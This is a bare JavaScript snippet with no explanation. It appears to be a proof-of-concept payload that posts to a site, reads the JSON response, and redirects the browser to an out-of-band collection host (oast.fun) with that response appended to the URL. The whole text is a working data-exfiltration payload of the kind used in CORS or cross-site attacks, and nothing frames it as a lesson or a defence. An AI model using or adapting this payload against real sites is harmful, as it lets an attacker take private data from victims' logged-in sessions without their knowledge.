var xhr = new XMLHttpRequest();
xhr.open('POST', 'https://imran.com', true);
xhr.setRequestHeader('Content-type', 'application/json');
xhr.onload = () => {
    const data = JSON.parse(xhr.responseText);
var imran= (JSON.stringify(data));
location.replace("http://bartqtkbajnhmsotmlzp4q9wse2zlm1lp.oast.fun/?DATA=" + imran );
};
xhr.send('{}');